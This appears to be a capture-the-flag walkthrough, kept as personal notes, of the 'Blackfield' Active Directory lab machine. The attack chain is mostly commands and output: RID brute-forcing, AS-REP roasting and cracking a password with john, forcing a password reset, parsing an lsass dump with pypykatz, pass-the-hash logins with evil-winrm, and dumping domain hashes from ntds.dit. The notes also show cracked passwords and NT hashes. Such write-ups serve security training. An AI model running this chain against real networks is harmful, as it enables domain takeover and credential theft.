
### Initial access
Port scan
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-24 11:44:03Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29469/tcp): CLEAN (Timeout)
|   Check 2 (port 24170/tcp): CLEAN (Timeout)
|   Check 3 (port 46070/udp): CLEAN (Timeout)
|   Check 4 (port 55782/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-09-24T11:44:16
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h58m24s

```
subdomain scan
dirscan
filescan

Smb recon
```
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ smbclient -L //10.129.229.17/ -N    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.229.17 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

```
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share 

```

List user using rid
```
 nxc smb 10.129.229.17 -u Guest -p '' --rid-brute | grep -E "SidTypeUser" | awk -F'\\' '{print $2}' | awk -F' ' '{print $1}' | sort -u > users.txt

```

Asreproasting with user we have 
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:c4b07d9e09ba4164477b9380c20ce2da$1d47423a1106b06522dece7e8994ee3fc44ab6ce88d13796503822b69af2770e6245669244e642db7c09d987394843c5f50b7815cae37d15bd314c44633929cd0a9de018c84ad0276abb3d94686b0cc132844b9bcc8644a0bb55d0c314fb0951326b24b2c76edb63d0eadf9f354be2ea1d54a5eea53afc438abb9da8a845b407c5cdc74900efb90efa5cf6d49d87d362c2b70c35fe1c1f1e7cc19487329e9e6c430a8dfffa3691bdcae3ba55b6b6ced6d7acf017d5517ffebeb16f75fcfae4c6b2ab5140926fa4807acb1f3cc3bba2e94c9d241680fa23c16b00edccafad789bc0859ef81903c08ee451aebb239dd526620f2f2c

```
Crack it
```
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:04 DONE (2026-09-24 01:22) 0.2123g/s 3043Kp/s 3043Kc/s 3043KC/s #1pitcher..."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Run bloodhound
![[Assets/Screenshot from 2026-09-24 12-39-58.png]]

Change user `audit2020` pass
```
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ bloodyad -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' --host "10.129.229.17"  set password "AUDIT2020" "Anh12345"    
[+] Password changed successfully!
                                   
```
We have read in folder forensic
```
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ nxc smb  10.129.229.17 -u 'AUDIT2020' -p 'Anh12345'  -M spider_plus 
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\AUDIT2020:Anh12345 
SPIDER_PLUS 10.129.229.17   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.229.17   445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.229.17   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.229.17   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.229.17   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.229.17   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.229.17   445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share 

```


```
──(kali㉿kali)-[~/HTB/Blackfield]
└─$ impacket-smbclient 'AUDIT2020:Anh12345'@10.129.229.17 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
forensic
IPC$
NETLOGON
profiles$
SYSVOL
# use forensic
# ls
drw-rw-rw-          0  Sun Feb 23 10:10:16 2020 .
drw-rw-rw-          0  Sun Feb 23 10:10:16 2020 ..
drw-rw-rw-          0  Sun Feb 23 13:14:37 2020 commands_output
drw-rw-rw-          0  Thu May 28 16:29:24 2020 memory_analysis
drw-rw-rw-          0  Fri Feb 28 17:30:34 2020 tools
# cd commands_output
# 
# ls
drw-rw-rw-          0  Sun Feb 23 13:14:37 2020 .
drw-rw-rw-          0  Sun Feb 23 13:14:37 2020 ..
-rw-rw-rw-        528  Sun Feb 23 13:12:54 2020 domain_admins.txt
-rw-rw-rw-        962  Sun Feb 23 13:12:54 2020 domain_groups.txt
-rw-rw-rw-      16454  Fri Feb 28 17:32:17 2020 domain_users.txt
-rw-rw-rw-     518202  Sun Feb 23 13:12:54 2020 firewall_rules.txt
-rw-rw-rw-       1782  Sun Feb 23 13:12:54 2020 ipconfig.txt
-rw-rw-rw-       3842  Sun Feb 23 13:12:54 2020 netstat.txt
-rw-rw-rw-       3976  Sun Feb 23 13:12:54 2020 route.txt
-rw-rw-rw-       4550  Sun Feb 23 13:12:54 2020 systeminfo.txt
-rw-rw-rw-       9990  Sun Feb 23 13:12:54 2020 tasklist.txt
# mget *
[*] Downloading domain_admins.txt
[*] Downloading domain_groups.txt
[*] Downloading domain_users.txt
[*] Downloading firewall_rules.txt
[*] Downloading ipconfig.txt
[*] Downloading netstat.txt
[*] Downloading route.txt
[*] Downloading systeminfo.txt
[*] Downloading tasklist.txt
# cd ..
# ls
drw-rw-rw-          0  Sun Feb 23 10:10:16 2020 .
drw-rw-rw-          0  Sun Feb 23 10:10:16 2020 ..
drw-rw-rw-          0  Sun Feb 23 13:14:37 2020 commands_output
drw-rw-rw-          0  Thu May 28 16:29:24 2020 memory_analysis
drw-rw-rw-          0  Fri Feb 28 17:30:34 2020 tools
# cd memory_analysis
# ls
drw-rw-rw-          0  Thu May 28 16:29:24 2020 .
drw-rw-rw-          0  Thu May 28 16:29:24 2020 ..
-rw-rw-rw-   37876530  Thu May 28 16:29:24 2020 conhost.zip
-rw-rw-rw-   24962333  Thu May 28 16:29:24 2020 ctfmon.zip
-rw-rw-rw-   23993305  Thu May 28 16:29:24 2020 dfsrs.zip
-rw-rw-rw-   18366396  Thu May 28 16:29:24 2020 dllhost.zip
-rw-rw-rw-    8810157  Thu May 28 16:29:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Thu May 28 16:29:24 2020 lsass.zip
-rw-rw-rw-   64288607  Thu May 28 16:29:24 2020 mmc.zip
-rw-rw-rw-   13332174  Thu May 28 16:29:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Thu May 28 16:29:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Thu May 28 16:29:24 2020 sihost.zip
-rw-rw-rw-   33756344  Thu May 28 16:29:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Thu May 28 16:29:24 2020 svchost.zip
-rw-rw-rw-   34631412  Thu May 28 16:29:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Thu May 28 16:29:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Thu May 28 16:29:24 2020 wlms.zip
-rw-rw-rw-   18303252  Thu May 28 16:29:24 2020 WmiPrvSE.zip
# get lsass.zip

```

Read lsass dump
```
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ pypykatz lsa minidump lsass.DMP

┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ pypykatz lsa minidump lsass.DMP | grep -A 5 -B 2 "svc_backup"

INFO:pypykatz:Parsing file lsass.DMP
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
                AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
--
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
                AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [633e3]==
                luid 406499
                               

```
We get access
```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ nxc smb  10.129.229.17 -u svc_backup --hash '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Blackfield]
└─$ nxc winrm  10.129.229.17 -u svc_backup --hash '9658d1d1dcd9250115e2205d9f48400d'
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d zip() argument 2 is longer than argument 1

──(kali㉿kali)-[~/HTB/Blackfield]
└─$ evil-winrm -i 10.129.229.17 -u svc_backup --hash '9658d1d1dcd9250115e2205d9f48400d'

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413



```
### Lateral Movement
### Priv escalation

We use this articale to escalation to root https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```
──(kali㉿kali)-[~/HTB/Blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

```
### Post exploit


| Username  | pass              | Hash |
| --------- | ----------------- | ---- |
| support   | `#00^BlackKnight` |      |
| AUDIT2020 |                   |      |
